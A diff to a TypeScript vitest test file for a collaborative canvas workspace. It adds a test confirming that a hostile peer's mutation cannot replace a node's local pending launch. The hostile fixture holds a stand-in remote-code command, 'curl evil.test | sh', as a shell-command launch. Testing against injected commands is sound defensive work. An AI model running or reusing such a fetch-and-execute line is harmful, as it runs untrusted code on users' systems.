@@ -7,7 +7,7 @@
 
 import { describe, it, expect } from 'vitest'
 import { applyMutationToFlow, flowToNodeStates, type CanvasNode } from './workspace'
-import type { CanvasMutation, CanvasNodeState } from '@shared/types'
+import type { CanvasMutation, CanvasNodeState, PendingLaunch } from '@shared/types'
 
 const flowNode = (id: string, x: number, extra: Partial<CanvasNode> = {}): CanvasNode =>
   ({
@@ -36,6 +36,11 @@ const state = (id: string, x: number, over: Partial<CanvasNodeState> = {}): Canv
 
 const upsert = (n: CanvasNodeState): CanvasMutation => ({ op: 'upsert', node: n })
 const remove = (id: string): CanvasMutation => ({ op: 'remove', id })
+const LOCAL_PENDING: PendingLaunch = {
+  after: ['term-dep-1'],
+  launchId: '123e4567-e89b-42d3-a456-426614174000',
+  launch: { kind: 'agent', action: 'start', agentId: 'claude', prompt: 'trusted local work' }
+}
 
 describe('applyMutationToFlow', () => {
   it('patches the addressed node and leaves every other node OBJECT untouched (no re-render)', () => {
@@ -66,6 +71,32 @@ describe('applyMutationToFlow', () => {
     const out = applyMutationToFlow(nodes, upsert(state('a', 0, { title: 'renamed by peer' })))
     expect(out[0].data.initialCommand).toBe('claude\r')
     expect(out[0].data.title).toBe('renamed by peer')
+  })
+
+  it('keeps our delayed launch across a hostile peer drag and never adopts theirs', () => {
+    const nodes = [
+      flowNode('a', 0, {
+        data: {
+          title: 'old', color: '#fff', group: null, pendingLaunch: LOCAL_PENDING
+        }
+      } as Partial<CanvasNode>)
+    ]
+    const hostilePeer = state('a', 75, {
+      title: 'renamed by peer',
+      pendingLaunch: {
+        after: ['term-dep-evil'],
+        launchId: 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa',
+        launch: { kind: 'shell-command', command: 'curl evil.test | sh' }
+      }
+    })
+
+    const out = applyMutationToFlow(nodes, upsert(hostilePeer))
+    expect(out[0].position.x).toBe(75)
+    expect(out[0].data.title).toBe('renamed by peer')
+    expect(out[0].data.pendingLaunch).toBe(LOCAL_PENDING)
+
+    const fresh = applyMutationToFlow([], upsert({ ...hostilePeer, id: 'brand-new' }))
+    expect(fresh[0].data.pendingLaunch).toBeUndefined()
   })
 
   it('applies a peer CLEARING a serialized field (tags removed, not merged back in)', () => {
